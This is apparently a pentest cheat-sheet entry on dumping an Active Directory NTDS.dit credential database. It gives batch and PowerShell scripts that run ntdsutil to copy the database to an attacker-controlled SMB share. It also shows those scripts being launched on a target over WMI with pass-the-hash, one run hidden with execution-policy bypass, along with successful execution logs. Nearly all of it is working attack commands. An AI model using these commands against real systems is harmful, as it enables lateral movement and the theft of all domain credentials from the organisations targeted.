## Dump NTDS.dit file:

How Attackers Dump Active Directory Database Credentials: https://adsecurity.org/?p=2398

How-to-dump-windows2012-credentials: https://github.com/nixawk/pentest-wiki/blob/master/4.Post-Exploitation/Windows_ActiveDirectory/How-to-dump-windows2012-credentials.md

Invoke-TheHash: https://github.com/Kevin-Robertson/Invoke-TheHash

### Make sure `temp` folder in SMB share is writable and empty before NTDSUtil tries writing to it

### Using batch script:
```
root@kali:/mnt/smb_share/temp# cat ../exp.bat 
ntdsutil "ac i ntds" "ifm" "create full \\192.168.136.128\kali_smb_share\temp" q q

PS C:\> Invoke-WMIExec -verbose -Domain test.local -Username master -Hash 4557b6a0a22dc7cafd03c4a40e77f7e1 -Target 192.168.136.130 -Command "cmd /c \\192.168.136.128\kali_smb_share\exp.bat"
VERBOSE: Connecting to 192.168.136.130:135
VERBOSE: WMI reports target hostname as WIN-PJNUFB8U83P
VERBOSE: test.local\master accessed WMI on 192.168.136.130
VERBOSE: Using WIN-PJNUFB8U83P for random port extraction
VERBOSE: Connecting to 192.168.136.130:49154
VERBOSE: Attempting command execution
Command executed with process ID 3116 on 192.168.136.130
```

### Using powershell script:
```
root@kali:/mnt/smb_share/temp# cat ../exp.ps1 
$A = Invoke-Expression 'ntdsutil "ac i ntds" "ifm" "create full \\192.168.136.128\kali_smb_share\temp" q q' -ErrorVariable $B -WarningVariable $C -Verbose
Out-File -FilePath \\192.168.136.128\kali_smb_share\temp\out.log -InputObject $A -Encoding ASCII
Out-File -FilePath \\192.168.136.128\kali_smb_share\temp\error.log -InputObject $B -Encoding ASCII
Out-File -FilePath \\192.168.136.128\kali_smb_share\temp\warning.log -InputObject $C -Encoding ASCII

PS C:\> Invoke-WMIExec -verbose -Domain test.local -Username master -Hash 4557b6a0a22dc7cafd03c4a40e77f7e1 -Target 192.168.136.130 -Command "powershell -NoP -sta -NonI -W Hidden -Exec bypass -File \\192.168.136.128\kali_smb_share\exp.ps1"
VERBOSE: Connecting to 192.168.136.130:135
VERBOSE: WMI reports target hostname as WIN-PJNUFB8U83P
VERBOSE: test.local\master accessed WMI on 192.168.136.130
VERBOSE: Using WIN-PJNUFB8U83P for random port extraction
VERBOSE: Connecting to 192.168.136.130:49154
VERBOSE: Attempting command execution
Command executed with process ID 3128 on 192.168.136.130
```
